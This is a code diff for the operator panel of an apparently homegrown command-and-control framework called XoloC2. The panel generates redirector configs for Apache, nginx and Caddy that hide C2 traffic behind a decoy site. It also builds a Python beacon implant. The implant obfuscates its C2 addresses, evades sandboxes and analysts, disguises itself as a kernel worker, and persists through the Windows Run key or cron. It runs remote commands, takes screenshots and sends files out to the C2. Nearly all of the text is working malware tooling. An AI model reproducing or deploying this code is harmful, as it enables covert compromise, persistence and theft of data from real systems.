+  const decoy  = document.getElementById('rd-decoy').value.trim() || 'https://www.microsoft.com/';
+  const path   = document.getElementById('rd-path').value.trim().replace(/\/$/, '') || '/api/beacon';
+  const proto  = window.location.protocol === 'https:' ? 'https' : 'http';
+
+  let config = '';
+  let title  = '';
+
+  if (type === 'apache') {
+    title = 'Apache 2.4 — VirtualHost';
+    config = `<VirtualHost *:80>
+    ServerName ${domain}
+    Redirect permanent / https://${domain}/
+</VirtualHost>
+
+<VirtualHost *:443>
+    ServerName ${domain}
+
+    SSLEngine on
+    SSLCertificateFile    /etc/letsencrypt/live/${domain}/fullchain.pem
+    SSLCertificateKeyFile /etc/letsencrypt/live/${domain}/privkey.pem
+
+    SSLProxyEngine on
+    SSLProxyVerify none
+    SSLProxyCheckPeerCN off
+    SSLProxyCheckPeerName off
+
+    ProxyRequests Off
+    ProxyPreserveHost Off
+
+    RewriteEngine On
+
+    # Forward beacon traffic to real C2
+    RewriteCond %{REQUEST_URI} ^${path}(.*)$ [NC]
+    RewriteRule ^(.*)$ ${proto}://${c2}%{REQUEST_URI} [P,L]
+
+    # Everything else → decoy
+    RewriteRule ^(.*)$ ${decoy} [R=302,L]
+
+    ErrorLog  /var/log/apache2/${domain}-error.log
+    CustomLog /var/log/apache2/${domain}-access.log combined
+</VirtualHost>`;
+  } else if (type === 'nginx') {
+    title = 'nginx — server block';
+    config = `server {
+    listen 80;
+    server_name ${domain};
+    return 301 https://$host$request_uri;
+}
+
+server {
+    listen 443 ssl;
+    server_name ${domain};
+
+    ssl_certificate     /etc/letsencrypt/live/${domain}/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/${domain}/privkey.pem;
+
+    # Forward beacon traffic to real C2
+    location ~ ^${path}(/.*)?$ {
+        proxy_pass          ${proto}://${c2};
+        proxy_ssl_verify    off;
+        proxy_set_header    Host              $host;
+        proxy_set_header    X-Real-IP         $remote_addr;
+        proxy_set_header    X-Forwarded-For   $proxy_add_x_forwarded_for;
+        proxy_read_timeout  60s;
+    }
+
+    # Everything else → decoy
+    location / {
+        return 302 ${decoy};
+    }
+
+    access_log /var/log/nginx/${domain}-access.log;
+    error_log  /var/log/nginx/${domain}-error.log;
+}`;
+  } else if (type === 'caddy') {
+    title = 'Caddyfile';
+    config = `${domain} {
+    # Forward beacon traffic to real C2
+    @beacon path_regexp beacon ^${path}(/.*)?$
+    reverse_proxy @beacon ${proto}://${c2} {
+        transport http {
+            tls_insecure_skip_verify
+        }
+    }
+
+    # Everything else → decoy
+    redir * ${decoy} 302
+}`;
+  }
+
+  document.getElementById('rd-output-title').textContent = title;
+  document.getElementById('rd-code').textContent = config;
+  document.getElementById('rd-output').style.display = 'block';
+}
+
+function copyRedirector() {
+  const code = document.getElementById('rd-code').textContent;
+  navigator.clipboard.writeText(code).then(() => {
+    const btn = document.getElementById('rd-copy-btn');
+    btn.textContent = '✓ Copied!';
+    setTimeout(() => btn.textContent = '⎘ Copy', 2000);
+  });
+}
+
+// ── Generate Beacon View ─────────────────────────────────
+function renderGenerateView() {
+  const content = document.getElementById('content');
+  content.innerHTML = `
+    <div style="max-width:860px;margin:0 auto">
+
+      <div style="margin-bottom:20px">
+        <h2 style="font-size:15px;font-weight:700;color:var(--text)">⚙ Generate Beacon</h2>
+        <p style="color:var(--text3);font-size:12px;margin-top:4px">Configure and download a Python beacon payload. Authorized engagements only.</p>
+      </div>
+
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:16px">
+        <div class="info-card" style="margin:0">
+          <h3>Connection</h3>
+          <div class="form-group" style="margin-bottom:8px">
+            <label>C2 Listeners (primario + fallbacks)</label>
+            <div id="gen-urls" style="display:flex;flex-direction:column;gap:5px">
+              <div style="display:flex;gap:6px">
+                <input type="text" class="gen-url-input" placeholder="https://your-c2:8443" style="flex:1;background:var(--bg3);border:1px solid var(--border);border-radius:4px;color:var(--text);font-family:var(--font-mono);font-size:12px;padding:7px 10px;outline:none">
+              </div>
+            </div>
+            <button class="btn btn-sm btn-ghost" style="margin-top:6px" onclick="addListenerField()">+ Agregar fallback</button>
+          </div>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:12px">
+            <div class="form-group" style="margin:0">
+              <label>Sleep (seconds)</label>
+              <input type="number" id="gen-sleep" value="5" min="1" max="300">
+            </div>
+            <div class="form-group" style="margin:0">
+              <label>Jitter %</label>
+              <input type="number" id="gen-jitter" value="20" min="0" max="80">
+            </div>
+          </div>
+          <label style="display:flex;align-items:center;gap:10px;cursor:pointer;user-select:none;color:var(--text2);font-size:12px">
+            <input type="checkbox" id="gen-persist" style="width:15px;height:15px;accent-color:var(--accent);cursor:pointer">
+            Persistencia (sobrevive reinicios)
+          </label>
+        </div>
+
+        <div class="info-card" style="margin:0">
+          <h3>Info</h3>
+          <div class="info-row"><span class="key">Type</span><span class="val">Python 3 beacon</span></div>
+          <div class="info-row"><span class="key">Protocol</span><span class="val">HTTPS polling</span></div>
+          <div class="info-row"><span class="key">Auth</span><span class="val">X-Agent-Secret header</span></div>
+          <div class="info-row"><span class="key">TLS</span><span class="val">Self-signed accepted</span></div>
+          <div class="info-row"><span class="key">Deps</span><span class="val">None (stdlib only)</span></div>
+        </div>
+      </div>
+
+      <div class="info-card" style="margin:0 0 16px 0">
+        <h3>Evasión</h3>
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px 24px;margin-top:4px">
+          <label style="display:flex;align-items:flex-start;gap:8px;cursor:pointer;font-size:12px;color:var(--text2)">
+            <input type="checkbox" id="ev-traffic" checked style="margin-top:2px;accent-color:var(--accent)">
+            <div><div style="color:var(--text)">Traffic camouflage</div><div style="color:var(--text3);font-size:11px">Fake browser User-Agent y headers HTTP reales</div></div>
+          </label>
+          <label style="display:flex;align-items:flex-start;gap:8px;cursor:pointer;font-size:12px;color:var(--text2)">
+            <input type="checkbox" id="ev-sandbox" checked style="margin-top:2px;accent-color:var(--accent)">
+            <div><div style="color:var(--text)">Sandbox detection</div><div style="color:var(--text3);font-size:11px">Detecta VMs, sandboxes y entornos de análisis</div></div>
+          </label>
+          <label style="display:flex;align-items:flex-start;gap:8px;cursor:pointer;font-size:12px;color:var(--text2)">
+            <input type="checkbox" id="ev-masq" style="margin-top:2px;accent-color:var(--accent)">
+            <div><div style="color:var(--text)">Process masquerade</div><div style="color:var(--text3);font-size:11px">Cambia el nombre del proceso (Linux)</div></div>
+          </label>
+          <label style="display:flex;align-items:flex-start;gap:8px;cursor:pointer;font-size:12px;color:var(--text2)">
+            <input type="checkbox" id="ev-encrypt" checked style="margin-top:2px;accent-color:var(--accent)">
+            <div><div style="color:var(--text)">Payload encryption</div><div style="color:var(--text3);font-size:11px">Cifra el body de cada request con XOR+nonce</div></div>
+          </label>
+        </div>
+      </div>
+
+      <button class="btn" onclick="generateBeacon()" style="width:100%;justify-content:center;padding:12px">
+        ⚡ Generate Beacon
+      </button>
+
+      <div id="gen-output" style="display:none;margin-top:20px">
+        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px">
+          <span style="color:var(--text2);font-size:12px">
+            Save as <code style="color:var(--accent)">beacon.py</code>
+          </span>
+          <div style="display:flex;gap:8px">
+            <button class="btn btn-sm btn-ghost" onclick="downloadBeacon('py')" title="Download Python script">⬇ .py</button>
+            <button class="btn btn-sm btn-ghost" onclick="downloadBeacon('linux')" title="Compile Linux ELF binary">⬇ Linux ELF</button>
+            <button class="btn btn-sm btn-ghost" onclick="showWindowsInstructions()" title="Windows compile instructions">🪟 Windows EXE</button>
+            <button class="btn btn-sm btn-ghost" onclick="copyBeacon()" id="copy-btn">⎘ Copy</button>
+          </div>
+        </div>
+        <div style="background:var(--bg);border:1px solid var(--border);border-radius:8px;overflow:hidden">
+          <div style="padding:8px 14px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px">
+            <span style="width:10px;height:10px;border-radius:50%;background:#ef4444;display:inline-block"></span>
+            <span style="width:10px;height:10px;border-radius:50%;background:#f59e0b;display:inline-block"></span>
+            <span style="width:10px;height:10px;border-radius:50%;background:#22c55e;display:inline-block"></span>
+            <span style="color:var(--text3);font-size:11px;margin-left:4px">beacon.py</span>
+          </div>
+          <pre id="beacon-code" style="margin:0;padding:16px;font-size:11px;line-height:1.6;color:var(--accent2);overflow-x:auto;max-height:420px;overflow-y:auto"></pre>
+        </div>
+        <div id="compile-status" style="display:none;margin-top:10px;padding:10px 14px;border-radius:6px;font-size:12px"></div>
+      </div>
+    </div>`;
+
+  document.querySelectorAll('.gen-url-input')[0].value = window.location.origin;
+}
+
+// ── Settings View ─────────────────────────────────────────
+async function renderSettingsView() {
+  const content = document.getElementById('content');
+  content.innerHTML = `
+    <div style="max-width:560px;margin:0 auto;display:flex;flex-direction:column;gap:16px;padding-bottom:40px">
+
+      <!-- Change Password -->
+      <div class="info-card" style="margin:0">
+        <h3>Change Password</h3>
+        <div class="error-msg" id="st-pw-error"></div>
+        <div id="st-pw-ok" style="display:none;color:var(--online);font-size:12px;margin-bottom:12px">✓ Contraseña actualizada.</div>
+        <div class="form-group" style="margin-bottom:12px">
+          <label>Contraseña actual</label>
+          <input type="password" id="st-pw-current" autocomplete="current-password">
+        </div>
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:14px">
+          <div class="form-group" style="margin:0">
+            <label>Nueva contraseña (min 12)</label>
+            <input type="password" id="st-pw-new" autocomplete="new-password">
+          </div>
+          <div class="form-group" style="margin:0">
+            <label>Confirmar nueva contraseña</label>
+            <input type="password" id="st-pw-confirm" autocomplete="new-password">
+          </div>
+        </div>
+        <button class="btn btn-sm" onclick="settingsChangePw()">Actualizar contraseña</button>
+      </div>
+
+      <!-- IP Whitelist -->
+      <div class="info-card" style="margin:0">
+        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:4px">
+          <h3 style="margin:0">IP Whitelist</h3>
+          <label style="display:flex;align-items:center;gap:8px;cursor:pointer;font-size:12px;color:var(--text2)">
+            <input type="checkbox" id="wl-enabled" style="accent-color:var(--accent)" onchange="toggleWhitelistWarning()">
+            Activar restricción
+          </label>
+        </div>
+        <p style="font-size:11px;color:var(--text3);margin-bottom:14px;line-height:1.6">
+          Restringe el panel a las IPs listadas. Los beacons nunca se bloquean.
+        </p>
+
+        <!-- Detected IP banner -->
+        <div id="wl-myip-banner" style="display:flex;align-items:center;justify-content:space-between;background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:10px 14px;margin-bottom:14px">
+          <div>
+            <div style="font-size:10px;color:var(--text3);text-transform:uppercase;letter-spacing:1px;margin-bottom:3px">Tu IP detectada por el servidor</div>
+            <div id="wl-myip-val" style="font-size:14px;font-family:var(--font-mono);color:var(--accent2)">Detectando...</div>
+          </div>
+          <button class="btn btn-sm btn-ghost" onclick="useMyIp()">↓ Usar esta IP</button>
+        </div>
+
+        <div id="wl-warning" style="display:none;background:rgba(245,158,11,0.1);border:1px solid rgba(245,158,11,0.3);border-radius:6px;padding:10px 14px;font-size:12px;color:var(--warning);margin-bottom:14px;line-height:1.6">
+          ⚠ Asegúrate de que tu IP esté en la lista antes de guardar o perderás acceso.
+        </div>
+
+        <table style="width:100%;margin-bottom:14px">
+          <thead>
+            <tr>
+              <th style="width:38%">Nombre</th>
+              <th>IP Pública</th>
+              <th style="width:40px"></th>
+            </tr>
+          </thead>
+          <tbody id="wl-tbody"></tbody>
+        </table>
+
+        <div style="display:grid;grid-template-columns:1fr 1fr auto;gap:8px;align-items:end;margin-bottom:14px">
+          <div class="form-group" style="margin:0">
+            <label>Nombre</label>
+            <input type="text" id="wl-new-name" placeholder="Oficina, Casa, VPN...">
+          </div>
+          <div class="form-group" style="margin:0">
+            <label>IP Pública</label>
+            <input type="text" id="wl-new-ip" placeholder="1.2.3.4" style="font-family:var(--font-mono)">
+          </div>
+          <button class="btn btn-sm btn-ghost" style="margin-bottom:1px" onclick="addWhitelistEntry()">+ Add</button>
+        </div>
+
+        <div style="display:flex;align-items:center;gap:12px">
+          <button class="btn btn-sm" onclick="saveWhitelist()">Guardar</button>
+          <span id="wl-status" style="font-size:12px;color:var(--text3)"></span>
+        </div>
+      </div>
+
+    </div>`;
+
+  // Load current whitelist
+  const res = await apiFetch('/api/settings/ipwhitelist');
+  if (res && res.ok) {
+    const data = await res.json();
+    document.getElementById('wl-enabled').checked = data.enabled;
+    toggleWhitelistWarning();
+    renderWhitelistTable(data.entries || []);
+  }
+
+  // Detect operator IP from server perspective
+  const ipRes = await apiFetch('/api/settings/myip');
+  if (ipRes && ipRes.ok) {
+    const { ip } = await ipRes.json();
+    document.getElementById('wl-myip-val').textContent = ip;
+    document.getElementById('wl-myip-val').dataset.ip = ip;
+  } else {
+    document.getElementById('wl-myip-val').textContent = 'No disponible';
+  }
+}
+
+function useMyIp() {
+  const ip = document.getElementById('wl-myip-val').dataset.ip;
+  if (ip) document.getElementById('wl-new-ip').value = ip;
+  document.getElementById('wl-new-name').focus();
+}
+
+let _wlEntries = [];
+
+function renderWhitelistTable(entries) {
+  _wlEntries = entries.map(e => ({...e}));
+  const tbody = document.getElementById('wl-tbody');
+  if (!tbody) return;
+  tbody.innerHTML = _wlEntries.length === 0
+    ? `<tr><td colspan="3" style="color:var(--text3);font-size:12px;text-align:center;padding:14px">No hay entradas</td></tr>`
+    : _wlEntries.map((e, i) => `
+      <tr>
+        <td style="font-size:12px">${escapeHtml(e.name)}</td>
+        <td style="font-size:12px;font-family:var(--font-mono)">${escapeHtml(e.ip)}</td>
+        <td style="text-align:right">
+          <button class="btn btn-sm btn-danger" style="padding:3px 8px;font-size:11px" onclick="removeWhitelistEntry(${i})">✕</button>
+        </td>
+      </tr>`).join('');
+}
+
+function addWhitelistEntry() {
+  const name = document.getElementById('wl-new-name').value.trim();
+  const ip   = document.getElementById('wl-new-ip').value.trim();
+  if (!name || !ip) return;
+  _wlEntries.push({ name, ip });
+  renderWhitelistTable(_wlEntries);
+  document.getElementById('wl-new-name').value = '';
+  document.getElementById('wl-new-ip').value = '';
+}
+
+function removeWhitelistEntry(idx) {
+  _wlEntries.splice(idx, 1);
+  renderWhitelistTable(_wlEntries);
+}
+
+function toggleWhitelistWarning() {
+  const enabled = document.getElementById('wl-enabled')?.checked;
+  const warn = document.getElementById('wl-warning');
+  if (warn) warn.style.display = enabled ? 'block' : 'none';
+}
+
+async function saveWhitelist() {
+  const enabled = document.getElementById('wl-enabled').checked;
+  const statusEl = document.getElementById('wl-status');
+  statusEl.textContent = 'Saving...';
+  statusEl.style.color = 'var(--text3)';
+
+  const res = await apiFetch('/api/settings/ipwhitelist', {
+    method: 'POST',
+    body: JSON.stringify({ enabled, entries: _wlEntries }),
+  });
+
+  if (!res || !res.ok) {
+    statusEl.textContent = '✗ Error saving';
+    statusEl.style.color = 'var(--danger)';
+    return;
+  }
+  statusEl.textContent = '✓ Saved';
+  statusEl.style.color = 'var(--online)';
+  setTimeout(() => { if (statusEl) statusEl.textContent = ''; }, 3000);
+}
+
+async function settingsChangePw() {
+  const errEl = document.getElementById('st-pw-error');
+  const okEl  = document.getElementById('st-pw-ok');
+  errEl.style.display = 'none';
+  okEl.style.display  = 'none';
+
+  const current = document.getElementById('st-pw-current').value;
+  const newPw   = document.getElementById('st-pw-new').value;
+  const confirm = document.getElementById('st-pw-confirm').value;
+
+  if (newPw.length < 12) {
+    errEl.textContent = 'La contraseña debe tener al menos 12 caracteres.';
+    errEl.style.display = 'block'; return;
+  }
+  if (newPw !== confirm) {
+    errEl.textContent = 'Las contraseñas no coinciden.';
+    errEl.style.display = 'block'; return;
+  }
+
+  const res = await apiFetch('/api/auth/change-password', {
+    method: 'POST',
+    body: JSON.stringify({ current_password: current, new_password: newPw }),
+  });
+
+  if (!res || !res.ok) {
+    const d = await res.json().catch(() => ({}));
+    errEl.textContent = d.detail || 'Error al cambiar contraseña.';
+    errEl.style.display = 'block'; return;
+  }
+
+  okEl.style.display = 'block';
+  document.getElementById('st-pw-current').value = '';
+  document.getElementById('st-pw-new').value = '';
+  document.getElementById('st-pw-confirm').value = '';
+}
+
+function addListenerField() {
+  const container = document.getElementById('gen-urls');
+  const div = document.createElement('div');
+  div.style.cssText = 'display:flex;gap:6px';
+  div.innerHTML = `<input type="text" class="gen-url-input" placeholder="https://fallback:8443" style="flex:1;background:var(--bg3);border:1px solid var(--border);border-radius:4px;color:var(--text);font-family:var(--font-mono);font-size:12px;padding:7px 10px;outline:none">
+    <button class="btn btn-sm btn-ghost" onclick="this.parentElement.remove()">✕</button>`;
+  container.appendChild(div);
+}
+
+async function generateBeacon() {
+  const urls = [...document.querySelectorAll('.gen-url-input')]
+    .map(i => i.value.trim()).filter(Boolean);
+  if (!urls.length) { alert('Agrega al menos un listener URL'); return; }
+  const sleep   = parseInt(document.getElementById('gen-sleep').value) || 5;
+  const jitter  = parseInt(document.getElementById('gen-jitter').value) || 20;
+  const persist = document.getElementById('gen-persist').checked;
+  const ev = {
+    traffic: document.getElementById('ev-traffic').checked,
+    sandbox: document.getElementById('ev-sandbox').checked,
+    masq:    document.getElementById('ev-masq').checked,
+    encrypt: document.getElementById('ev-encrypt').checked,
+  };
+
+  const res = await apiFetch('/api/info/agent-secret');
+  if (!res || !res.ok) { alert('Failed to get agent secret'); return; }
+  const info = await res.json();
+
+  const code = generateBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev);
+  document.getElementById('beacon-code').textContent = code;
+  document.getElementById('gen-output').style.display = 'block';
+}
+
+function generateBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {}) {
+  if (!Array.isArray(urls)) urls = [urls];
+  function xorEnc(str, key) {
+    const enc = new TextEncoder();
+    const b = enc.encode(str), k = enc.encode(key);
+    return Array.from(b).map((c, i) => c ^ k[i % k.length]).map(c => c.toString(16).padStart(2, '0')).join('');
+  }
+  const xk = Array.from(crypto.getRandomValues(new Uint8Array(16)))
+    .map(b => String.fromCharCode(97 + b % 26)).join('');
+  const eUrls = urls.map(u => xorEnc(u, xk));
+  const es = xorEnc(secret, xk);
+
+  // ── Evasion code blocks ───────────────────────────────────────────────────
+  const uaBlock = ev.traffic ? `
+_UA_POOL = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/124.0.0.0 Safari/537.36",
+]
+_REFERERS = [
+    "https://www.google.com/",
+    "https://www.bing.com/search?q=windows+update",
+    "https://outlook.office365.com/mail/inbox",
+    "https://teams.microsoft.com/",
+    "https://docs.microsoft.com/en-us/",
+]
+` : '';
+
+  const sandboxBlock = ev.sandbox ? `
+def _check_env():
+    import multiprocessing as _mp
+    if _mp.cpu_count() < 2:
+        sys.exit(0)
+    try:
+        if _WIN:
+            import ctypes as _ct
+            m = _ct.c_ulonglong(0)
+            _ct.windll.kernel32.GetPhysicallyInstalledSystemMemory(_ct.byref(m))
+            if m.value < 2 * 1024 * 1024:
+                sys.exit(0)
+        else:
+            with open('/proc/meminfo') as f:
+                for line in f:
+                    if 'MemTotal' in line:
+                        if int(line.split()[1]) < 2 * 1024 * 1024:
+                            sys.exit(0)
+                        break
+    except: pass
+    _u = (os.getenv('USER') or os.getenv('USERNAME') or '').lower()
+    if any(x in _u for x in ['sandbox','malware','virus','sample','honey','cuckoo','analyst']):
+        sys.exit(0)
+    _h = socket.gethostname().lower()
+    if any(x in _h for x in ['sandbox','malware','virus','analysis','cuckoo','vbox','vmware']):
+        sys.exit(0)
+    if _WIN:
+        try:
+            _r = subprocess.run("tasklist /FO CSV /NH", shell=True, capture_output=True, text=True, timeout=5)
+            _bad = ['vboxservice','vmtoolsd','vmsrvc','vboxtray','sandboxiedcomlaunch','wireshark','procmon','fiddler']
+            for _p in _r.stdout.lower().split(','):
+                if any(_b in _p for _b in _bad): sys.exit(0)
+        except: pass
+    _t0 = time.time(); time.sleep(0.5)
+    if time.time() - _t0 < 0.4:
+        sys.exit(0)
+_check_env()
+` : '';
+
+  const masqBlock = ev.masq ? `
+def _masquerade():
+    if not _WIN:
+        try:
+            import ctypes as _ct
+            _ct.CDLL(None).prctl(15, b'[kworker/0:1]', 0, 0, 0)
+        except: pass
+_masquerade()
+` : '';
+
+  const encBlock = ev.encrypt ? `
+def _enc_body(data_bytes):
+    nonce = os.urandom(8)
+    key = (SECRET + nonce.hex()).encode()
+    out = bytes([data_bytes[i] ^ key[i % len(key)] for i in range(len(data_bytes))])
+    return _json.dumps({"enc": 1, "nonce": nonce.hex(), "data": out.hex()}).encode()
+
+def _dec_resp(resp_bytes):
+    try:
+        obj = _json.loads(resp_bytes)
+        if isinstance(obj, dict) and obj.get("enc") == 1:
+            key = (SECRET + obj["nonce"]).encode()
+            raw = bytes.fromhex(obj["data"])
+            return bytes([raw[i] ^ key[i % len(key)] for i in range(len(raw))])
+        return resp_bytes
+    except:
+        return resp_bytes
+` : '';
+
+  const postBodyLine = ev.encrypt
+    ? `    body = _enc_body(_json.dumps(data).encode())`
+    : `    body = _json.dumps(data).encode()`;
+
+  const postHeaders = ev.traffic
+    ? `            hdrs = {"Content-Type": "application/json",
+                    "X-Agent-Secret": SECRET,
+                    "User-Agent": random.choice(_UA_POOL),
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                    "Accept-Language": "en-US,en;q=0.5",
+                    "Accept-Encoding": "gzip, deflate",
+                    "Referer": random.choice(_REFERERS)}`
+    : `            hdrs = {"Content-Type": "application/json",
+                    "X-Agent-Secret": SECRET}`;
+
+  const respParse = ev.encrypt
+    ? `_json.loads(_dec_resp(resp.read()))`
+    : `_json.loads(resp.read())`;
+
+  return `#!/usr/bin/env python3
+"""
+XoloC2 Beacon
+Generated: ${new Date().toISOString()}
+FOR AUTHORIZED USE ONLY
+"""
+import uuid, platform, socket, os, subprocess, time, random, sys, threading as _th, base64 as _b64
+
+try:
+    import urllib.request as _req
+    import json as _json
+    import ssl
+except ImportError:
+    sys.exit(1)
+
+_WIN = sys.platform == 'win32'
+SLEEP  = ${sleep}
+JITTER = ${jitter}
+
+# XOR-decoded at runtime — no plaintext C2 or secret in file
+def _x(h, k):
+    b = bytes.fromhex(h); k = k.encode()
+    return bytes([b[i] ^ k[i % len(k)] for i in range(len(b))]).decode()
+_k      = "${xk}"
+C2_URLS = [_x(h, _k) for h in [${eUrls.map(e => `"${e}"`).join(', ')}]]
+SECRET  = _x("${es}", _k)
+_url_idx = 0
+
+_BASE    = os.path.dirname(os.path.abspath(__file__))
+_ID_FILE = os.path.join(_BASE, ".beacon_id")
+
+def _get_or_create_id():
+    if os.path.exists(_ID_FILE):
+        with open(_ID_FILE) as f:
+            return f.read().strip()
+    new_id = str(uuid.uuid4())
+    with open(_ID_FILE, "w") as f:
+        f.write(new_id)
+    return new_id
+
+AGENT_ID = _get_or_create_id()
+
+_CWD_FILE = os.path.join(_BASE, ".beacon_cwd")
+
+def _load_cwd():
+    if os.path.exists(_CWD_FILE):
+        with open(_CWD_FILE) as f:
+            p = f.read().strip()
+            if os.path.isdir(p):
+                return p
+    return os.getcwd()
+
+def _save_cwd(p):
+    try:
+        with open(_CWD_FILE, "w") as f:
+            f.write(p)
+    except Exception:
+        pass
+
+_cwd = _load_cwd()${uaBlock}${sandboxBlock}${masqBlock}
+${persist ? `
+def _persist():
+    try:
+        src = os.path.abspath(__file__)
+        if _WIN:
+            import winreg
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
+                0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, "SystemHealthMonitor", 0, winreg.REG_SZ,
+                f'"{sys.executable}" "{src}"')
+            winreg.CloseKey(key)
+        else:
+            import subprocess as _sp
+            entry = f"@reboot {sys.executable} {src} &"
+            existing = _sp.run("crontab -l", shell=True, capture_output=True, text=True).stdout
+            if entry not in existing:
+                _sp.run(f'(crontab -l 2>/dev/null; echo "{entry}") | crontab -', shell=True)
+    except Exception:
+        pass
+_persist()
+` : ''}${encBlock}
+SSL_CTX = ssl.create_default_context()
+SSL_CTX.check_hostname = False
+SSL_CTX.verify_mode    = ssl.CERT_NONE
+
+def _post(path, data):
+    global _url_idx
+${postBodyLine}
+    for i in range(len(C2_URLS)):
+        url = C2_URLS[(_url_idx + i) % len(C2_URLS)]
+        try:
+${postHeaders}
+            r = _req.Request(url + path, data=body, headers=hdrs, method="POST")
+            with _req.urlopen(r, context=SSL_CTX, timeout=15) as resp:
+                _url_idx = (_url_idx + i) % len(C2_URLS)
+                return ${respParse}
+        except Exception:
+            continue
+    return None
+
+def _get_bytes(path):
+    global _url_idx
+    for i in range(len(C2_URLS)):
+        url = C2_URLS[(_url_idx + i) % len(C2_URLS)]
+        try:
+            r = _req.Request(url + path, headers={"X-Agent-Secret": SECRET}, method="GET")
+            with _req.urlopen(r, context=SSL_CTX, timeout=30) as resp:
+                return resp.read()
+        except Exception:
+            continue
+    return None
+
+def _os_info():
+    try:    return platform.system() + " " + platform.release() + " " + platform.machine()
+    except: return "Unknown"
+
+def _local_ip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close(); return ip
+    except: return "127.0.0.1"
+
+def run_command(cmd, task_id=None):
+    global _cwd
+    cmd = cmd.strip()
+
+    if cmd.startswith("sleep "):
+        try:
+            global SLEEP; SLEEP = int(cmd.split()[1])
+            return f"Sleep set to {SLEEP}s"
+        except: return "Usage: sleep <seconds>"
+
+    if cmd == "info":
+        return (f"ID:       {AGENT_ID}\\n"
+                f"Hostname: {socket.gethostname()}\\n"
+                f"User:     {os.getenv('USER') or os.getenv('USERNAME') or 'unknown'}\\n"
+                f"OS:       {_os_info()}\\n"
+                f"IP:       {_local_ip()}\\n"
+                f"PID:      {os.getpid()}\\n"
+                f"CWD:      {_cwd}")
+
+    if cmd == "screenshot":
+        import base64, tempfile, time as _t
+        tmp = tempfile.mktemp(suffix=".png")
+        try:
+            if _WIN:
+                ps_cmd = (
+                    "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; "
+                    "$s=[System.Windows.Forms.Screen]::PrimaryScreen; "
+                    "$b=New-Object System.Drawing.Bitmap($s.Bounds.Width,$s.Bounds.Height); "
+                    "$g=[System.Drawing.Graphics]::FromImage($b); "
+                    "$g.CopyFromScreen($s.Bounds.Location,[System.Drawing.Point]::Empty,$s.Bounds.Size); "
+                    f"$b.Save('{tmp}')"
+                )
+                r = subprocess.run(["powershell", "-WindowStyle", "Hidden", "-Command", ps_cmd],
+                                   capture_output=True, timeout=15)
+                if r.returncode != 0:
+                    return f"Screenshot failed: {r.stderr.decode(errors='ignore')}"
+            else:
+                try:
+                    from PIL import ImageGrab
+                    ImageGrab.grab().save(tmp, "PNG")
+                except ImportError:
+                    r = subprocess.run(["scrot", tmp], capture_output=True, timeout=10)
+                    if r.returncode != 0:
+                        return "screenshot requires scrot: apt install scrot"
+            with open(tmp, "rb") as f:
+                b64 = base64.b64encode(f.read()).decode()
+            fname = f"screenshot_{int(_t.time())}.png"
+            return f"__b64file__:{fname}:{b64}"
+        except Exception as e:
+            return f"Error: {e}"
+        finally:
+            try: os.remove(tmp)
+            except: pass
+
+    if cmd == "ps":
+        try:
+            import signal as _sig
+            if _WIN:
+                r = subprocess.run("tasklist /FO CSV /NH", shell=True, capture_output=True, text=True, timeout=15)
+                lines = [l for l in r.stdout.strip().splitlines() if l]
+                out = []
+                for l in lines:
+                    parts = [p.strip('"') for p in l.split('","')]
+                    if len(parts) >= 2:
+                        out.append(f"{parts[1].rjust(6)}  {parts[0]}")
+                return "  PID  NAME\\n" + "\\n".join(out) if out else "(no processes)"
+            else:
+                r = subprocess.run(["ps", "aux", "--no-headers"], capture_output=True, text=True, timeout=15)
+                lines = r.stdout.strip().splitlines()
+                out = []
+                for l in lines:
+                    p = l.split(None, 10)
+                    if len(p) >= 11:
+                        out.append(f"{p[1].rjust(6)}  {p[0].ljust(12)}  {p[10][:60]}")
+                return "  PID  USER          CMD\\n" + "\\n".join(out) if out else r.stdout.strip()
+        except Exception as e:
+            return f"Error: {e}"
+
+    if cmd.startswith("kill "):
+        try:
+            import signal as _sig
+            pid = int(cmd.split()[1])
+            if _WIN:
+                subprocess.run(f"taskkill /F /PID {pid}", shell=True, capture_output=True, timeout=10)
+            else:
+                os.kill(pid, _sig.SIGTERM)
+            return f"[+] Signal sent to PID {pid}"
+        except ProcessLookupError:
+            return f"PID {pid} not found"
+        except Exception as e:
+            return f"Error: {e}"
+
+    if cmd.startswith("download "):
+        import base64
+        path = cmd[9:].strip()
+        if not os.path.isabs(path):
+            path = os.path.join(_cwd, path)
+        try:
+            with open(path, "rb") as f: data = f.read()
+            b64 = base64.b64encode(data).decode()
+            return f"__b64file__:{os.path.basename(path)}:{b64}"
+        except Exception as e:
+            return f"Error reading {path}: {e}"
+
+    if cmd.startswith("__upload__:") and task_id:
+        _, filename, dest = cmd.split(":", 2)
+        if dest.endswith("/") or dest.endswith("\\\\") or os.path.isdir(dest):
+            dest = os.path.join(dest.rstrip("/\\\\"), filename)
